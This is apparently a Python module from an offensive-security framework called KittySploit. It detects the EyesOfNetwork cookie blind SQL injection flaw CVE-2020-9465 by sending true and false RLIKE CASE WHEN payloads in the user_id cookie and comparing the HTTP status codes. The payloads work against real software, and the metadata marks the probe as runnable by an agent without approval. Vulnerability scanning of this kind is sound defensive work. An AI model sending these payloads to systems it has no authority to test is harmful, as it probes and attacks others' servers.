#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""EyesOfNetwork user_id cookie blind SQL injection (CVE-2020-9465)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'EyesOfNetwork - user_id Cookie Blind SQLi Detection (CVE-2020-9465)',
        'description': (
            'Detects CVE-2020-9465 by sending two user_id cookies with RLIKE CASE WHEN '
            'payloads: false condition yields HTTP 500, true condition yields HTTP 302.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2020', 'eyesofnetwork', 'sqli', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2020_8656_detect'],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2020-9465'],
        'cve': 'CVE-2020-9465',
    }

    base_path = OptString('', 'Optional EON base path', required=False)

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def run(self):
        path = f'{self._prefix()}/index.php'
        false_cookie = (
            "1' RLIKE (SELECT (CASE WHEN (2550=2551) THEN 1 ELSE 0x28 END))-- qMSU"
        )
        true_cookie = (
            "1' RLIKE (SELECT (CASE WHEN (2550=2550) THEN 1 ELSE 0x28 END))-- qMSU"
        )
        r1 = self.http_request(
            method='GET',
            path=path,
            cookies={'user_id': false_cookie},
            allow_redirects=False,
        )
        if not r1 or r1.status_code != 500:
            return False
        r2 = self.http_request(
            method='GET',
            path=path,
            cookies={'user_id': true_cookie},
            allow_redirects=False,
        )
        if r2 and r2.status_code in (301, 302):
            self.set_info(
                severity='high',
                reason='EyesOfNetwork user_id blind SQLi (CVE-2020-9465)',
                path=path,
            )
            return True
        return False
